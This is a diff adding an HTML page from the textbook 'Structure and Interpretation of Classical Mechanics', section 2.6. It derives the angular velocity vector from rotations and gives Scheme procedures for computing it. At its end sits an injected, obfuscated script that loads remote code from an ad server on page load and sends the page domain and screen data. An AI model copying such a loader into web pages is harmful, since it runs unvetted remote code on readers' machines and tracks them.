@@ -1,0 +1,161 @@
+<!doctype html public "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html>
+<!-- Generated from TeX source by tex2page, v 4p3, 
+     (c) Dorai Sitaram, http://www.cs.rice.edu/~dorai/tex2page -->
+<head>
+<title>
+
+Structure and Interpretation 
+of Classical Mechanics
+
+</title>
+<link rel="stylesheet" type="text/css" href="book-Z-C.css" title=default>
+<meta name=robots content="noindex,follow">
+</head>
+<body>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-25.html">previous</a></span><span>, <a href="book-Z-H-27.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<a name="%_sec_2.6"></a>
+<h2><a href="book-Z-H-4.html#%_toc_%_sec_2.6">2.6&nbsp;&nbsp;Representation of the Angular Velocity Vector</a></h2>
+<p><a name="%_idx_1166"></a>
+<a name="%_idx_1168"></a><a name="%_idx_1170"></a>We can specify the orientation of a body by specifying the rotation
+that takes the body to this orientation from some reference
+orientation.  As the body moves, the rotation that does this changes.
+The angular velocity vector can be written in terms of this changing
+rotation along a path.</p>
+<p>
+<a name="FIGURE_2.1"></a></p>
+<div align=left><img src="chap2-Z-G-33.gif" border="0"></div>
+<p></p>
+<p>
+Let <em>q</em> be the coordinate path that we will use to describe
+the motion of the body.  Let  <em>M</em>(<em>q</em>(<em>t</em>)) be the rotation
+that takes the body from the reference orientation to the orientation
+specified by <em>q</em>(<em>t</em>) (see figure&nbsp;<a href="#FIGURE_2.1">2.1</a>).  Let
+<img src="chap2-Z-G-D-3.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub>(<em>t</em>) be the vector to some constituent particle with the body
+in the orientation specified by <em>q</em>(<em>t</em>), and let <img src="chap2-Z-G-D-3.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub>' be
+the vector to the same constituent with the body in the reference
+orientation.
+Then
+<a name="EQUATION_2.31"></a></p>
+<div align=left><img src="chap2-Z-G-34.gif" border="0"></div>
+<p>
+The constituent vectors
+<img src="chap2-Z-G-D-3.gif" border="0"><sub><img src="chap1-Z-G-D-21.gif" border="0"></sub><sup>/</sup> do not depend on the configuration, because they
+are the vectors to the positions of the constituents with the body in a
+fixed reference orientation.</p>
+<p>
+
+We have already found an expression for the kinetic energy in terms of
+the angular velocity vector and the inertia tensor.  Here we do this in a
+different way.  To compute the kinetic energy we accumulate the
+contributions from all of the mass elements.  The positions of the
+constituent particles, at a given time <em>t</em>, are
+<a name="EQUATION_2.32"></a></p>
+<div align=left><img src="chap2-Z-G-35.gif" border="0"></div>
+<p> 
+where <em>M</em>  =   <em>M</em> <small>o</small> <em>q</em>.  The velocity is the
+time derivative
+<a name="EQUATION_2.33"></a></p>
+<div align=left><img src="chap2-Z-G-36.gif" border="0"></div>
+<p>
+Using equation&nbsp;(<a href="#EQUATION_2.32">2.32</a>), we can write
+<a name="EQUATION_2.34"></a></p>
+<div align=left><img src="chap2-Z-G-37.gif" border="0"></div>
+<p>
+Recall that the velocity results from a rotation, and that the
+velocities are (see equation&nbsp;<a href="book-Z-H-22.html#EQUATION_2.11">2.11</a>)
+<a name="EQUATION_2.35"></a></p>
+<div align=left><img src="chap2-Z-G-38.gif" border="0"></div>
+<p>
+<a name="%_idx_1172"></a>Thus we can identify the operator <img src="chap2-Z-G-D-8.gif" border="0">(<em>t</em>) &times; with <em>D</em><em>M</em>(<em>t</em>)
+(<em>M</em>(<em>t</em>))<sup><tt>-</tt>1</sup>.  To form the kinetic energy we need to extract
+<img src="chap2-Z-G-D-8.gif" border="0">(<em>t</em>) from this.</p>
+<p>
+If a vector <img src="chap2-Z-G-D-15.gif" border="0"> is represented by the component matrix <strong><em>u</em></strong> with components <em>x</em>, <em>y</em>, and <em>z</em>,  the function <a name="%_idx_1174"></a><a name="%_idx_1176"></a> <em>A</em> 
+that produces the matrix representation of
+<img src="chap2-Z-G-D-15.gif" border="0">&times; from the component matrix <strong><em>u</em></strong> is
+<a name="EQUATION_2.36"></a></p>
+<div align=left><img src="chap2-Z-G-39.gif" border="0"></div>
+<p>
+The inverse of this function can
+be applied to any skew-symmetric matrix, and so we can use 
+<em>A</em><sup><tt>-</tt>1</sup> to extract the components <a name="%_idx_1178"></a> <img src="chap1-Z-G-D-23.gif" border="0"> of the angular velocity vector
+from the matrix representation of <img src="chap2-Z-G-D-8.gif" border="0"> &times;
+in terms of <em>M</em>:
+<a name="EQUATION_2.37"></a></p>
+<div align=left><img src="chap2-Z-G-40.gif" border="0"></div>
+<p>
+where <strong><em>M</em></strong> and <em>D</em><strong><em>M</em></strong> are the matrix representations of
+the functions <em>M</em> and <em>D</em><em>M</em>, and where we have used the fact that
+for a matrix representation of a rotation the transpose gives the
+inverse.</p>
+<p>
+The components  <img src="chap1-Z-G-D-23.gif" border="0">' of the angular velocity vector on the
+principal axes are  <img src="chap1-Z-G-D-23.gif" border="0">'  =  <strong><em>M</em></strong><sup><tt><em>T</em></tt></sup>  <img src="chap1-Z-G-D-23.gif" border="0">, so
+<a name="EQUATION_2.38"></a></p>
+<div align=left><img src="chap2-Z-G-41.gif" border="0"></div>
+<p></p>
+<p>
+The relationship of the angular velocity vector to the path is a
+kinematic relationship; it is valid for any path.  Thus we can
+abstract it to obtain the components of the angular velocity at a
+moment given the configuration and velocity at that moment.</p>
+<p>
+
+</p>
+<a name="%_sec_Temp_190"></a>
+<h4><a href="book-Z-H-4.html#%_toc_%_sec_Temp_190">Implementation of angular velocity functions</a></h4>
+<p></p>
+<p>
+The following procedure gives the components of the angular velocity as a
+function of time along the path:
+</p>
+<p><tt><a name="%_idx_1180"></a>(define&nbsp;(((M-of-q-&gt;omega-of-t&nbsp;M-of-q)&nbsp;q)&nbsp;t)<br>
+&nbsp;&nbsp;(define&nbsp;M-on-path&nbsp;(compose&nbsp;M-of-q&nbsp;q))<br>
+&nbsp;&nbsp;(define&nbsp;(omega-cross&nbsp;t)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(*&nbsp;((D&nbsp;M-on-path)&nbsp;t)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(m:transpose&nbsp;(M-on-path&nbsp;t))))<br>
+&nbsp;&nbsp;(antisymmetric-&gt;column-matrix&nbsp;(omega-cross&nbsp;t)))<br>
+</p>
+</tt>
+<p><a name="%_idx_1182"></a><a name="%_idx_1184"></a>The procedure <tt>omega-cross</tt> produces the matrix representation of
+<img src="chap2-Z-G-D-8.gif" border="0">&times;.  The procedure <tt>antisymmetric-&gt;column-matrix</tt>, which corresponds to the function 
+<em>A</em><sup><tt>-</tt>1</sup>, is used to extract the
+components of the angular velocity vector from the skew-symmetric
+<img src="chap2-Z-G-D-8.gif" border="0">&times; matrix.</p>
+<p>
+The body components of the angular velocity
+vector as a function of time along the path are
+</p>
+<p><tt>(define&nbsp;(((M-of-q-&gt;omega-body-of-t&nbsp;M-of-q)&nbsp;q)&nbsp;t)<br>
+&nbsp;&nbsp;(*&nbsp;(m:transpose&nbsp;(M-of-q&nbsp;(q&nbsp;t)))<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(((M-of-q-&gt;omega-of-t&nbsp;M-of-q)&nbsp;q)&nbsp;t)))<br>
+</p>
+</tt>
+<p>
+We can get the procedures of local state that give the angular velocity
+components by abstracting these procedures along arbitrary paths that
+have given coordinates and velocities.  The abstraction of a procedure 
+of a path to a procedure of state is accomplished by <tt>Gamma-bar</tt>
+(see section&nbsp;<a href="book-Z-H-16.html#%_sec_1.9">1.9</a>):
+</p>
+<p><tt>(define&nbsp;(M-&gt;omega&nbsp;M-of-q)<br>
+&nbsp;&nbsp;(Gamma-bar<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(M-of-q-&gt;omega-of-t&nbsp;M-of-q)))<br>
+<br>
+<a name="%_idx_1186"></a>(define&nbsp;(M-&gt;omega-body&nbsp;M-of-q)<br>
+&nbsp;&nbsp;(Gamma-bar<br>
+&nbsp;&nbsp;&nbsp;&nbsp;(M-of-q-&gt;omega-body-of-t&nbsp;M-of-q)))<br>
+</p>
+</tt>
+<p>These procedures give the angular velocities as a function of state.
+We will see them in action after we get some <tt>M-of-q</tt>'s with
+which to work.</p>
+<p>
+
+</p>
+<div class=navigation>[Go to <span><a href="book.html">first</a>, <a href="book-Z-H-25.html">previous</a></span><span>, <a href="book-Z-H-27.html">next</a></span> page<span>; &nbsp;&nbsp;</span><span><a href="book-Z-H-4.html#%_toc_start">contents</a></span><span><span>; &nbsp;&nbsp;</span><a href="book-Z-H-82.html#%_index_start">index</a></span>]</div>
+<p></p>
+<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582NgXaqsgjSGNhMkGfMSQiD3R34cA9JsGuDiYxQJd85RFL8iF5qwic5nLDoIUN1jmPS9o11xLdDbxi3i1Q9b21uZxR0P2D%2fyTQSLBvQs3Cn%2f%2bDWJ0eciMwHWRFd%2b27oeH3o4TuunXAXx5I82J402MCkY0UnfhtN9otRoLkk48jY6s7IqPWTeJKh5TmpbSaw68M1IAnG2%2bi8u0Yeuv4yx%2bm22SMmb9POLDJCcvZ3A4xQZWEdyT%2bKAVMfNPFSkLFqmy%2bI8BMxRhzL1ZY3jh6aLn40Hgk76FmqqC2u6B5yRQh015BfpnDUQQV9EZf1RyoNUhRGsPX6SNchYQcLbmduUB%2bp13BkDTzBVHIcgi5jo57utfGMU4ohURmYiCZkzflGD9YpFQsF%2fReD1%2bWJcc0WTyGMH%2fETTMAniH1zW9mpvEkPDGgZbCduWhv5oKJX493j6mI3DQJXoC0Ry5fhpYAa7cyA1rleVnvzQBmtox2TmINvQX");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body></body>
+</html>
